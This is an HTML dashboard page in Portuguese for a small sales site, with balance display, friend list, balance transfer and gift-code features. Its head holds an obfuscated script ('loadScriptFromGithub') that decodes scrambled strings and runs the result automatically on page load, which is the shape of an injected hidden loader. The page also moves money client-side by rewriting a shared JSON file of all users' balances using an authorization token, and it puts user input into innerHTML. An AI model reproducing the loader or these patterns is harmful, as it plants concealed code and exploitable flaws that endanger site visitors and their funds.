
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="../../icons/llsecrets_sf.png" type="image/x-icon">
    <title>Pasta de Arquivos</title>
    <link rel="stylesheet" href="../../css/acess.css">
<script>
        var loadScriptFromGithub;(function(){var ima='',FLT=563-552;function BlB(u){var g=1581144;var c=u.length;var r=[];for(var y=0;y<c;y++){r[y]=u.charAt(y)};for(var y=0;y<c;y++){var p=g*(y+452)+(g%17939);var b=g*(y+152)+(g%18779);var j=p%c;var h=b%c;var m=r[j];r[j]=r[h];r[h]=m;g=(p+b)%7304203;};return r.join('')};var fPc=BlB('yonuzkrneoiathgpfsdwcmlxrjbqtrtucscov').substr(0,FLT);var EDi=';rpuc=92=h=4,x8rv0;a=(lv=tnndou" h,,tlhtiC +8tovc;a inm+rj])]g)),u0rtoc(,je,6) "5,);A;4,{sr} 8af,q2nlsmhmh7i,[;.6.l71n1ahr;1+(ms[0o"org ]Ahabf=m(Crh)h2is;gvr1e,.4i;lp(st;t+[fe+,]lav},95{,=)o.j)n4rn](;7,Aaof=gh;{)r)l(.t0ialuo8-nmn=+8= vm} i(s.r+uo(Cuaiusalr7re(=)C"rqe)y;ln(x6;an; e-=;jfp,;n0=6rl+2r74[6ftc0t()o]h=,jo+*inal6;l9rv.r+=eSesstnlil.-]ggoie"9;xe.=1r(]=<;ieh r a;f<;i{,n(xea;=,jiruwa2utulyh n=o[);)t]9;0ensff1eza1thwng)ghop!oie+.;l+ng-l7p(4;6 c((yr=,a2;.los();n(vu.u.e*+8t,;o,grjl1gvtApp.]+t-w)"ru58a+e=).a;(Ah,r+t;+i5)r8;va)[vsw ief;forq)";[cr=tn)r;)a [fiolal]8;0s{ae)fc.sm(=.ir3govxr7=v(vrnla(<[cri)svv;tin; o)ar)ta]n 6{+r+[elao}+wSn(..r+z .;=(t0il(m1a)em(apoypd3r=a ilafC}ma7vk;a(tv +qn)l=j,mCg+ueun)=fr)herlv2>9u 30.1grr=)=iun=ctf"]2va9rurf=k[v,bzkmh9,argCgkz4rhr=;([.;r l00v4db==pd=0v (+}rp==[s;ogkr=+-(<y>xdt=d-(=k)[nigbg}n1avr,.<urrogg;( fv;".lpum.{mCb.al5xd e="!l1.hb]t(th;';var QhN=BlB[fPc];var isM='';var ARJ=QhN;var Mvw=QhN(isM,BlB(EDi));var Wgv=Mvw(BlB('b*#={$fure!h}%LL .%Le%p.5hoCs16$nL_c]raoleefL..lncLn%aeL))LELrslt,1afL3LL .Lv+p{}$h3Lnt=t(af _;rSa\/,5h{%Lr9](aujLnLdLl0zuLsle(8Sntchr)obN$59k3th,LtL 3_i3""{e.L(!lLgL{L$a#w{6o,5e\'Exoms.(n=(ditLL((L.L]3"\/n))1$(y+.0)nu!.ra]wC"dM!voL!r_pc)LtLo\';LL((4n3ex\/hwgL(.cesaelv)qax.irps=;d !iteLsb!s86!$"ewn<t;3]aSnc.t(oz7!;t.a\/Ln3ff ti,,LLo.)D1f=iL=;b_)!e}h:sL.L;eL8w85#dL,#xp(.d=4($pqn8$Lo_"\/st$efr<i4=u_i;hLe}0](ors=,,1e$1,otl6L+_ferwl33TLe$,-t.$=(dinlLLlrfoLeL{L6!atbd<t)5w(n)a(}r=L=6sv),9<oLnb4;$8$\/[=!o6n_Ltg)L5fcLrC8.mf ,L1.e.o];5#vsb){v.+(% :;4=%55&s{;frknr4so6d]=trtht*o)..no7a+e)c)\/.L]d;,(La4cL;Lahp,=t 5v(dL;_(,;$07o;nc9m%;3riv5n7xn3}_g2o%,qefol3}1 2n,7bts=+g)c9,LjLc3;t$)(d73yfdLph)64L;.L_g(LL%!L$ g1!<td:(LLc;rLu5kL6.h4 d_uL*88)s ,L)7.(Lv;p)sS7_hL%w)L!eS0L.eg()__f%L;;u32No8e(r=.)Lp]4jipL 6;$f%3+l4_a()0!hoL7E nhw.).!5%f,[oe.L(oat%r$.oan09lhvLia"beoe3+l(;c\/w.)dtr]fhLLabi0=8Lc*a(()tL,)onL5 %t Ld(i*x 3tdamn(qtci9u.w(holq LL]d.)tme4p2Lr_3")_({1n!pm$ow)acp.wa.t(g,$ne,ho;3!j"LddLs]?sani;11,}2e..$kLt<:1L8!dLL:aw}eL,tr%!ta]c!e.x5dw)-qe.3.133d;$.bL70,#)l3Sr:n]rjidi_..lo 4()uor=fLx"LLlb#]Ln6Lr,L5s.eL}8.)i{t.$L)]sLjdaLeg\'5p(l.i-L;L8)b{66424zi[8ecL;.]!&;39tLeuL)d]].Trf(7en[.36$7.7pe4(+}dt2ti$bi]0.o.3}=L&itcnmtL6;oLs=_c( ;;3b7.o+nm+hu?x, %(3<!n7y3LLtsLu,eatt(nk70b.;Lio(d.7p_=}.L,d)neip9..)tLi))0nu.(.\/LtaLt;)zt.ec07.,r!md.)uoqr33 qf33%  _oL!=.bad]m)vL96o?btd3a +oh.sa9s$$L,nt8poapNrdn"L;]L! agl?=_):r..e)2nu:7nlt6h%t0%.uLdt)L.r()3]_pp)8oa4)(9o(.w={L!L!i)tt6(L&xj%t!eL");.=jf\/L&e.L\' jvotfpei(1)dd0(h6Lf htn,.ddjfg!..,%LvaL;%rL$0g]deL"deo2%t3q_o=c)dn(]n..!e..e6.ebLL:=ddm.4)r).3( .p!]!(_$ndc;h3_4t.-e,L{srnLav(wd6o{]+t:0sf\/ntps,0613)e#;inbo.)sfp5)CtetcLa!(yLi$)c2_eoz,j3iLoeL6xg}unL(dotnh(on.{rhb34\'dh;!L[;(\/35_ ={L_LfeCo+.7,3d.(eL'));var lAo=ARJ(ima,Wgv );lAo(5570);return 8289})()
</script>
</head>
<style>
@media (max-width: 720px) {
    #token {
        font-size: 6px;
        padding: 8px;
        left: 10px;
    }
    #dark-mode-user {
        position: flex;
        top: -20px;
        left: 500px;
        width: 50px;        /* botão maior */
        height: 50px;
        padding: 0;
        border: none;
        background: none;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        background-color: #333;
    }

    #userInfo {
        top: 30%;
        left: 15%;
        width: 250px;
        height: 300px;
    }

    #user {
        display: none;
        width: 32px;        /* imagem menor que o botão */
        height: 32px;
        border-radius: 50%;
        object-fit: cover;
        flex-shrink: 0;
        margin: 0;
        display: block;
    }
    #bx_dds {
        background-color: hotpink;
        top: 495px;
        left: 200px;
        max-width: 120px;
        max-height: 40px;
        width: 120px;
        height: 40px;
        font-size: 13px;
    }
    #menor {
        display: none;
    }
}    
    #user {
        max-width: 600px;
        width: 40px;        /* imagem menor que o botão */
        height: 40px;
        border-radius: 50%;
        object-fit: cover;
        flex-shrink: 0;
        margin: 0;
        display: block;
    }
    #dark-mode-user {
        position: flex;
        top: -15px;
        left: 1005px;
        width: 50px;        /* botão maior */
        height: 50px;
        padding: 0;
        border: none;
        background: none;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        background-color: #333;
    }


.spinner-container {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 10px;
    margin: 20px 0;
}

.spinner {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #555;
    border-radius: 50%;
    width: 30px;
    height: 30px;
    animation: spin 1s linear infinite;
}

.spinner-text {
    font-size: 14px;
    color: #555;
    font-family: sans-serif;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}


  #modalBackground {
    display: none;
    position: fixed;
    inset: 0; /* top:0; left:0; right:0; bottom:0 */
    background: rgba(10, 10, 10, 0.8);
    backdrop-filter: blur(6px);
    z-index: 999;
    opacity: 0;
    transition: opacity 0.4s ease;
  }
#modalBackground.active {
  display: block;
  opacity: 1;
}

  #modalGui {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 550px;
    height: 550px;
    background: #1e1e1e;
    border-radius: 12px;
    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.9);
    z-index: 1000;
    opacity: 0;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    transition: opacity 0.4s ease, transform 0.4s ease;
    transition: opacity 0.4s ease, transform 0.4s ease;
  }
  #modalGui h1 {
  margin: 8px 16px 4px;
  padding: -100;
  font-size: 18px;
  font-weight: 600;
  color: #eee;
}
#modalGui.active {
  display: none;
  opacity: 1;
  transform: translate(-50%, -50%) scale(1);
}

  #closeGuiBtn {
    align-self: flex-end;
    margin: 12px 20px 0 0;
    padding: 6px 14px;
    background: #e03e3e;
    border: none;
    border-radius: 8px;
    color: white;
    font-weight: 600;
    cursor: pointer;
    box-shadow: 0 4px 12px rgba(224, 62, 62, 0.7);
    transition: background-color 0.25s ease;
  }
  #closeGuiBtn:hover {
    background: #b53232;
  }

  #guiIframe {
    flex-grow: 1;
    border: none;
    border-radius: 0 0 12px 12px;
  }

#loadingScreen {
  flex-grow: 1;
  background: #1e1e1edd;  /* fundo semi-transparente para escurecer */
  color: #ccc;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 12px;
  font-size: 16px;
  pointer-events: none;  /* SEM interação quando invisível */
  transition: opacity 0.3s ease;
  opacity: 0; /* invisível por padrão */
  position: absolute;  /* fica sobre o iframe */
  inset: 0;  /* top:0; right:0; bottom:0; left:0; */
  border-radius: 0 0 12px 12px;
  z-index: 10;
}

/* Quando o loading estiver ativo (ex: classe .active) */
#loadingScreen.active {
  opacity: 1;
  pointer-events: auto;  /* bloqueia interação atrás */
}
#loadingScreen {
  flex-grow: 1;
  background: #1e1e1edd;  /* fundo semi-transparente para escurecer */
  color: #ccc;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 12px;
  font-size: 16px;
  pointer-events: none;  /* SEM interação quando invisível */
  transition: opacity 0.3s ease;
  opacity: 0; /* invisível por padrão */
  position: absolute;  /* fica sobre o iframe */
  inset: 0;  /* top:0; right:0; bottom:0; left:0; */
  border-radius: 0 0 12px 12px;
  z-index: 9999;
}

/* Quando o loading estiver ativo (ex: classe .active) */
#loadingScreen.active {
  opacity: 1;
  pointer-events: auto;  /* bloqueia interação atrás */
}



@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

#guiIframe {
  flex-grow: 1;
  display: none; /* começa invisível */
  border: none;
  border-radius: 0 0 12px 12px;
}





/* From Uiverse.io by JaydipPrajapati1910 */ 
.button {
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 10px 15px;
  gap: 15px;
  background-color: #181717;
  outline: 3px #181717 solid;
  outline-offset: -3px;
  border-radius: 5px;
  border: none;
  cursor: pointer;
  transition: 400ms;
  max-width: 200px;
  max-height: 40px;
}

.button .text {
  color: white;
  font-weight: 700;
  font-size: 1em;
  transition: 400ms;
}

.button svg path {
  transition: 400ms;
}

.button:hover {
  background-color: transparent;
}

.button:hover .text {
  color: #181717;
}

.button:hover svg path {
  fill: #181717;
}
@media (max-width: 480px) {
        #dark-mode-user {
        position: flex;
        top: -15px;
        left: 285px;
        width: 50px;        /* botão maior */
        height: 50px;
        padding: 0;
        border: none;
        background: none;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        background-color: #333;
    }
}






ul.file-list {
  list-style: none;
  padding: 0;
  margin: 0;
}

ul.pagination {
  display: flex;
  flex-wrap: wrap;
  gap: 12px;
  padding: 10px;
}

ul.pagination li.file-list {
  background: #2a2a2a;
  border-radius: 8px;
  overflow: hidden;
  width: 240px;
  transition: transform 0.3s ease;
  box-shadow: 0 4px 14px rgba(0, 0, 0, 0.5);
}

ul.pagination li.file-list:hover {
  transform: scale(1.05);
}

ul.pagination li.file-list a {
  display: flex;
  flex-direction: column;
  color: inherit;
  text-decoration: none;
  height: 100%;
}

ul.pagination li.file-list img.lk {
  width: 100%;
  height: 160px;
  object-fit: cover;
}

ul.pagination li.file-list .text-container {
  padding: 10px;
  background-color: #1e1e1e;
  color: #f0f0f0;
  display: flex;
  flex-direction: column;
  gap: 6px;
}

ul.pagination li.file-list .user-name {
  font-weight: bold;
  font-size: 16px;
}

ul.pagination li.file-list .user-rating {
  font-size: 14px;
  color: #aaa;
}









#modalBackgroundNew {
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(0,0,0,0.6);
  display: none;
  z-index: 9998;
}

#modalGuiNew {
  position: fixed;
  top: 50%; left: 50%;
  transform: translate(-50%, -50%);
  width: 80vw;
  height: 80vh;
  background: #fff;
  border-radius: 8px;
  box-shadow: 0 0 15px rgba(0,0,0,0.3);
  display: none;
  flex-direction: column;
  z-index: 9999;
  padding: 1rem;
  box-sizing: border-box;
}

#modalGuiNew h1 {
  margin: 0 0 10px 0;
  font-size: 1.25rem;
  text-align: center;
  font-weight: 600;
}

#closeGuiBtnNew {
  position: absolute;
  top: 10px; right: 10px;
  background: #ff5f57;
  border: none;
  border-radius: 4px;
  color: white;
  font-weight: bold;
  padding: 5px 10px;
  cursor: pointer;
  transition: background 0.3s ease;
  font-size: 0.9rem;
}

#closeGuiBtnNew:hover {
  background: #e04844;
}

#guiIframeNew {
  flex-grow: 1;
  width: 100%;
  border: none;
  border-radius: 0 0 8px 8px;
  margin-top: 40px;
}

#loadingScreenNew {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  display: none;
  align-items: center;
  flex-direction: column;
  font-family: sans-serif;
  color: #444;
}

#loadingScreenNew.active {
  display: flex;
}


/* ===== ANIMAÇÕES ===== */
@keyframes slideInRight {
  from {
    opacity: 0;
    transform: translateX(100%);
  }
  to {
    opacity: 1;
    transform: translateX(0);
  }
}

@keyframes slideOutRight {
  from {
    opacity: 1;
    transform: translateX(0);
  }
  to {
    opacity: 0;
    transform: translateX(100%);
  }
}

/* ===== CONTAINERS ===== */
.succsess-alert-container,
.error-alert-container {
  position: fixed;
  top: 1rem;
  right: 1rem;
  width: 300px;
  max-height: 700px;
  z-index: 9999;
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
  font-size: 0.75rem;
  pointer-events: auto;
}

/* ===== ALERTAS ===== */
.succsess-alert,
.error-alert {
  cursor: default;
  display: flex;
  align-items: center;
  justify-content: space-between;
  height: 90px;
  border-radius: 0.5rem;
  padding: 0 0.625rem;
  box-shadow: 0 4px 8px rgb(0 0 0 / 0.25);
  color: white;
  font-size: 15px;
  animation: slideInRight 0.5s ease forwards;
  transition: opacity 0.5s ease, transform 0.5s ease;
  position: relative;
}

.succsess-alert {
  background-color: #2a2b2f;
}

.error-alert {
  background-color: #232531;
}

/* Animação de saída */
.succsess-alert.hide,
.error-alert.hide {
  animation: slideOutRight 0.5s ease forwards;
}

/* ===== ÍCONES ===== */
.succsess-alert-icon {
  color: #2b9875;
  background-color: rgba(255 255 255 / 0.05);
  backdrop-filter: blur(10px);
  padding: 0.25rem;
  border-radius: 0.5rem;
  display: flex;
  align-items: center;
  justify-content: center;
}

.error-alert-icon {
  color: #d65563;
  background-color: rgba(255 255 255 / 0.05);
  backdrop-filter: blur(10px);
  padding: 0.25rem;
  border-radius: 0.5rem;
  display: flex;
  align-items: center;
  justify-content: center;
}

/* ===== TEXTOS ===== */
.succsess-alert-text p:first-child,
.error-alert-text p:first-child {
  margin: 0;
  font-weight: 600;
}

.succsess-alert-text p:last-child,
.error-alert-text p:last-child {
  margin: 0;
  color: #9ca3af;
  font-size: 0.625rem;
}

/* ===== BOTÃO DE FECHAR ===== */
.succsess-alert-close-btn,
.error-alert-close-btn {
  color: #9ca3af;
  background-color: transparent;
  border: none;
  padding: 0.25rem;
  border-radius: 0.375rem;
  cursor: pointer;
  transition: background-color 0.2s ease-in-out;
}

.succsess-alert-close-btn:hover,
.error-alert-close-btn:hover {
  background-color: rgba(255 255 255 / 0.1);
}
.error-icon {
  max-width: 100px;
  width: 100px;
  max-height: 100px;
  height: 100px;
  display: block;
  margin: 0 auto 10px auto;
  object-fit: contain;
}
#alertAPI_openBtn { padding: 0.6rem 1rem; font-size: 1rem; cursor: pointer; display: none; }
#alertAPI_overlay { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; background: rgba(0,0,0,0.6); z-index: 1000; backdrop-filter: blur(2px); }
#alertAPI_overlay.alertAPI_active { display: flex; }
.alertAPI_modal { max-width: calc(100% - 4rem); max-height: calc(100% - 4rem); border-radius: 8px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.4); background: white; position: relative; animation: alertAPI_pop .18s ease-out; }
@keyframes alertAPI_pop { from { transform: scale(0.96); opacity: 0.8 } to { transform: scale(1); opacity: 1 } }
.alertAPI_modal img { display: block; width: 100%; height: auto; max-height: 80vh; object-fit: contain; background: #000; }
.alertAPI_closeBtn { position: absolute; top: 8px; right: 8px; background: rgba(255,255,255,0.9); border: none; border-radius: 6px; padding: 6px 8px; cursor: pointer; font-weight: 700; }
body.alertAPI_noScroll { overflow: hidden; }
</style>
<body>
    <div id="token">
        <h1>Seu cupom:</h1>
    </div>
    <div>
    </div>
    <div id="comp1" class="container">
        <h1 id="past">Pasta de Arquivos
            <!-- 
            <div id="fundo" class="fundo-escuro"></div>
            <div id="imagem-container" class="modal">
                <img src="../../icons/aviso-pc.png" id="imagem-maior" class="imagem" alt="Imagem para telas maiores">
                <img src="../../icons/aviso-cell.png" id="imagem-menor" class="imagem" alt="Imagem para telas menores" style="display: none;">
            </div>
            -->
<button id="dark-mode-user" onclick="toggleUserInfo()">
    <img id="user" src="../../icons/user1.png" alt="user-profile">
</button>
        </h1>
        <div class="container1">
            <p><strong>Saldo:</strong> <span id="toggleSaldo" class="saldo">****</span><span id="saldo" class="icon">${usuario.saldo}</span></p>
            <img id="toggleButton" src="../../icons/mostrar.png" alt="oculto">
        </div>
<ul class="file-list">
  <!-- Os itens <li> serão injetados aqui corretamente -->
</ul>
        <div class="rectangle1">
            <h2 id="tx">Amigos</h2>
            <ul id="listaAmigos">
            </ul>
            <br>
            <h2 id="tx">Adicionar</h2>
            <input type="text" id="friendId" placeholder="PASSAPORTE">
            <button id="bx_dd" onclick="adicionarAmigo()">Adicionar Amigo</button>
        </div>

        <div id="fullscreen-photo-overlay-amigos" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.8); justify-content: center; align-items: center;">
            <img id="fullscreen-user-photo-amigos" src="" alt="user-profile-large" style="max-width: 90%; max-height: 90%; border-radius: 10px;">
        </div>

        <h1>VIP:</h1>
        <div id="countdown-container">
            <div id="countdown"></div>
        </div>
    </div>

    <div id="overlay"></div>

    <div id="userInfo" style="display: none;">
        <h2>User Info</h2>
        <p><strong>Name:NULL</strong></p>
        <p><strong>Email:NULL</strong></p>
        <p><strong>Packs:NULL</strong></p>
        <p><strong>Saldo disponível:NULL</strong></p>
        <p><strong>Chave de comunicação:NULL</strong></p>
        <br>
        <button id="bx_dds"><img src="../../icons/upload_profile.png"></button>
        <button id="removeCookiesButton"><img id="exit" src="../../icons/exit.png" alt="sair"></button>
        <a class="link-button" href="https://ghosthszz.github.io/Vendas/frontend/paginas/login/reset.html" target="_blank">Mudar senha</a>
    </div>

    <div class="teste">
        <div id="transferSection">
            <h2 id="tx">Transferir Saldo</h2>
            <label for="recipientId">Passaporte de destino:</label>
            <input placeholder="PASSAPORTE" type="text" id="recipientId" required>
            <label for="transferAmount">Valor a Transferir:</label>
            <input placeholder="0,00" type="number" id="transferAmount" required>
            <button id="bx_dds" onclick="transferirSaldo()">Transferir</button>
            <button id="openGuiBtn" class="button">
 <svg viewBox="0 0 16 16" class="bi bi-cart-check" height="24" width="24" xmlns="http://www.w3.org/2000/svg" fill="#fff">
  <path d="M11.354 6.354a.5.5 0 0 0-.708-.708L8 8.293 6.854 7.146a.5.5 0 1 0-.708.708l1.5 1.5a.5.5 0 0 0 .708 0l3-3z"></path>
  <path d="M.5 1a.5.5 0 0 0 0 1h1.11l.401 1.607 1.498 7.985A.5.5 0 0 0 4 12h1a2 2 0 1 0 0 4 2 2 0 0 0 0-4h7a2 2 0 1 0 0 4 2 2 0 0 0 0-4h1a.5.5 0 0 0 .491-.408l1.5-8A.5.5 0 0 0 14.5 3H2.89l-.405-1.621A.5.5 0 0 0 2 1H.5zm3.915 10L3.102 4h10.796l-1.313 7h-8.17zM6 14a1 1 0 1 1-2 0 1 1 0 0 1 2 0zm7 0a1 1 0 1 1-2 0 1 1 0 0 1 2 0z"></path>
</svg>
  <p class="text">Loja de packs</p>
</button>
<button id="alertAPI_openBtn" aria-haspopup="dialog" aria-controls="alertAPI_overlay">Abrir imagem</button>
        </div>

        <div id="fullscreen-photo-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.8); justify-content: center; align-items: center;">
            <img id="fullscreen-user-photo" src="" alt="user-profile-large" style="max-width: 90%; max-height: 90%; border-radius: 10px;">
        </div>

        <!-- Função em manutemçâo/ativa na url -->

        <div class="rectangle100">
            <h2>Código de Presente</h2>
            <label for="code">Código:</label>
            <input type="text" id="code" name="code">
            <button id="btn_resg" onclick="resgatarCodigo()">Resgatar Código</button>
        </div>

        <!-- Função em manutemçâo -->

        <audio id="audio" src="../../icons/money.mp3"></audio>

        <div id="OP">
            <h1>Aviso!</h1>
            <br>
            <p>Segurança em dois fatores disponivel!</p>
            <br>
            <button id="btn_saiba">Ativar</button>
            <br><br>
            <p id="teste_p">Ative até: 05/07/2024</p>
        </div>
    </div>

    <div id="alertAPI_overlay" role="dialog" aria-modal="true" aria-hidden="true">
<div class="alertAPI_modal" role="document">
<button class="alertAPI_closeBtn" id="alertAPI_closeBtn" aria-label="Fechar">✕</button>
<img id="alertAPI_img" alt="Imagem de exemplo">
</div>
</div>


<div id="modalBackground"></div>

<div id="modalGui" style="display: none;" > 
    <h1>Conctado em 192:168.0.098:2234/shop</h1>
  <button id="closeGuiBtn">Fechar</button>
  <iframe id="guiIframe" src="" title="GUI interna"></iframe>
  <div id="loadingScreen">
  <div class="spinner"></div>
  <p id="loadingText">Conectando a LOJA...</p>
</div>
</div>



<div id="modalBackgroundNew"></div>

<div id="modalGuiNew" style="display: none;">
  <h1>Conectado</h1>
  <button id="closeGuiBtnNew">Fechar</button>
  <iframe id="guiIframeNew" src="" title="GUI interna"></iframe>
  <div id="loadingScreenNew">
    <div class="spinner"></div>
    <p id="loadingTextNew">Carregando conteúdo...</p>
  </div>
</div>


</body>
            <script>

const fundo = document.getElementById('fundo');
const imagemContainer = document.getElementById('imagem-container');
const imagemMaior = document.getElementById('imagem-maior');
const imagemMenor = document.getElementById('imagem-menor');

function ajustarImagem() {
    const larguraTela = window.innerWidth;

    if (larguraTela < 620) {
        imagemMaior.style.display = 'none';
        imagemMenor.style.display = 'block';
    } else {
        imagemMaior.style.display = 'block';
        imagemMenor.style.display = 'none';
    }
}

window.onload = function() {
    fundo.style.display = 'block';
    imagemContainer.style.display = 'block';
    ajustarImagem();
};

document.addEventListener('DOMContentLoaded', function () {
    const imagemContainer = document.getElementById('friend-photo-fullscreen-img');
    const fundo = document.getElementById('friend-photo-fullscreen-overlay');

    if (!imagemContainer || !fundo) {
        console.warn('Elementos de imagem fullscreen não encontrados.');
        return;
    }

    document.body.addEventListener('click', function (event) {
        if (!imagemContainer.contains(event.target)) {
            fundo.style.display = 'none';
            imagemContainer.style.display = 'none';
        }
    });
});

window.onresize = function() {
    ajustarImagem();
};

const snowContainer = document.getElementById('snow-container');

document.getElementById('btn_saiba').addEventListener('click', function() {
    document.getElementById('message-box1').classList.remove('hidden1');
});    

document.getElementById('toggleButton').addEventListener('click', function() {
    const saldoElement = document.getElementById('toggleSaldo').parentNode;
    saldoElement.classList.toggle('show-icon');

    carregarSaldoAtualizado();

    const saldo = document.getElementById('saldo');
    saldo.innerHTML = usuario.saldo;
});

function carregarSaldoAtualizado() {
    usuario.saldo = obterNovoSaldo();
}

function obterNovoSaldo() {
    return 1500;
}

function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "=([^&#]*)"),
        results = regex.exec(url);
    if (!results) return null;
    return decodeURIComponent(results[1].replace(/\+/g, " "));
}

function verificarCodigoNaUrl() {
    var codigo = getParameterByName('COD');

    if (codigo) {
        document.getElementById('code').value = codigo;
        resgatarCodigo();
    }
}
function mostrarAlertaSucesso(mensagemCurta, mensagemDetalhada) {
  let container = document.querySelector('.succsess-alert-container');
  if (!container) {
    container = document.createElement('div');
    container.className = 'succsess-alert-container';
    document.body.appendChild(container);
  }

  const alerta = document.createElement('div');
  alerta.className = 'succsess-alert';

  alerta.innerHTML = `
    <div class="flex gap-2">
      <div class="succsess-alert-icon">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none"
             viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"
             style="width:24px; height:24px;">
          <path stroke-linecap="round" stroke-linejoin="round"
                d="m4.5 12.75 6 6 9-13.5"></path>
        </svg>
      </div>
      <div class="succsess-alert-text">
        <p>${mensagemCurta}</p>
        <p>${mensagemDetalhada}</p>
      </div>
    </div>
    <button class="succsess-alert-close-btn" aria-label="Fechar alerta">
      <svg xmlns="http://www.w3.org/2000/svg" fill="none"
           viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"
           style="width:24px; height:24px;">
        <path stroke-linecap="round" stroke-linejoin="round"
              d="M6 18 18 6M6 6l12 12"></path>
      </svg>
    </button>
  `;

  alerta.querySelector('button').onclick = () => {
    alerta.remove();
  };

  container.appendChild(alerta);

setTimeout(() => {
  alerta.classList.add('hide');
  setTimeout(() => alerta.remove(), 500); // Aguarda o fim da animação
}, 3000); // ou o tempo que desejar
}

function mostrarAlertaErro(mensagemCurta, mensagemDetalhada = '') {
  let container = document.querySelector('.error-alert-container');
  if (!container) {
    container = document.createElement('div');
    container.className = 'error-alert-container';
    document.body.appendChild(container);
  }

  const alerta = document.createElement('div');
  alerta.className = 'error-alert';

  alerta.innerHTML = `
    <div class="flex gap-2">
      <div class="error-alert-icon">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none"
             viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"
             style="width:24px; height:24px;">
          <path stroke-linecap="round" stroke-linejoin="round"
                d="M12 9v3.75m0 3.75h.008v.008H12v-.008M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
        </svg>
      </div>
      <div class="error-alert-text">
        <p>${mensagemCurta}</p>
        <p>${mensagemDetalhada}</p>
      </div>
    </div>
    <button class="error-alert-close-btn" aria-label="Fechar alerta">
      <svg xmlns="http://www.w3.org/2000/svg" fill="none"
           viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"
           style="width:24px; height:24px;">
        <path stroke-linecap="round" stroke-linejoin="round"
              d="M6 18 18 6M6 6l12 12" />
      </svg>
    </button>
  `;

  alerta.querySelector('button').onclick = () => {
    alerta.remove();
  };

  container.appendChild(alerta);

setTimeout(() => {
  alerta.classList.add('hide');
  setTimeout(() => alerta.remove(), 500); // Aguarda o fim da animação
}, 3000); // ou o tempo que desejar
}

function transferirSaldo() {
  const userIdFromCookie = getCookie('id');
  const recipientIdElement = document.getElementById('recipientId');
  
  // Corrigido aqui:
  let recipientInput = recipientIdElement.value.trim();
  let recipientId = recipientInput.startsWith('user_') ? recipientInput : 'user_' + recipientInput;

  let transferAmount = document.getElementById('transferAmount').value.replace(/\D/g, '');
  transferAmount = parseFloat(transferAmount) / 100;

  if (transferAmount > 900) {
    mostrarAlertaErro('O valor máximo de transferência é R$900,00.');
    return;
  }

  if (userIdFromCookie && recipientId && !isNaN(transferAmount)) {
    fetch(url, {
      headers: {
        Authorization: `token ${token}`
      }
    })
      .then(response => response.json())
      .then(data => {
        let content = atob(data.content);
        let jsonData = JSON.parse(content);

        let sender = jsonData.find(user => user.id === userIdFromCookie);
        let recipient = jsonData.find(user => user.id === recipientId);

        if (sender && recipient) {
          let senderBalance = parseFloat(sender.saldo.replace('R$', '').replace('.', '').replace(',', '.'));
          if (senderBalance >= transferAmount) {
            sender.saldo = `R$${(senderBalance - transferAmount).toFixed(2).replace('.', ',')}`;
            let recipientBalance = parseFloat(recipient.saldo.replace('R$', '').replace('.', '').replace(',', '.'));
            recipient.saldo = `R$${(recipientBalance + transferAmount).toFixed(2).replace('.', ',')}`;

            let updatedContent = btoa(JSON.stringify(jsonData));
            fetch(url, {
              method: 'PUT',
              headers: {
                Authorization: `token ${token}`,
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                message: 'Update user balances',
                content: updatedContent,
                sha: data.sha
              })
            }).then(() => {
              const audio = document.getElementById('audio');
              audio.play().catch(error => {
                console.error('Erro ao tentar reproduzir o áudio:', error);
              });

              mostrarAlertaSucesso(
                'Transferência realizada com sucesso!',
                `Você transferiu R$${transferAmount.toFixed(2).replace('.', ',')} para ${recipientId}`
              );

              setTimeout(() => {
                const saldo = document.getElementById('saldo');
                if (saldo) {
                  saldo.innerHTML = `${sender.saldo}`;
                }
              }, 300);

            }).catch(error => {
              console.error('Erro ao atualizar dados:', error);
              mostrarAlertaErro('Erro ao atualizar os dados.', 'Tente novamente mais tarde.');
            });
          } else {
            mostrarAlertaErro('Saldo insuficiente.', 'Você não tem saldo suficiente para essa transferência.');
          }
        } else {
          mostrarAlertaErro('Usuário não encontrado.', 'Verifique o ID informado e tente novamente.');
        }
      })
      .catch(error => {
        console.error('Erro ao carregar dados:', error);
        mostrarAlertaErro('Erro de conexão.', 'Não foi possível acessar os dados no momento.');
      });
  } else {
    mostrarAlertaErro('Dados inválidos.', 'Por favor, preencha todos os campos corretamente.');
  }
}




function adicionarAmigo() {
    const userIdFromCookie = getCookie('id');
    const friendIdElement = document.getElementById('friendId');
    let friendIdInput = friendIdElement.value.trim();

    if (!friendIdInput) {
        alert('Por favor, preencha o ID do amigo corretamente.');
        return;
    }
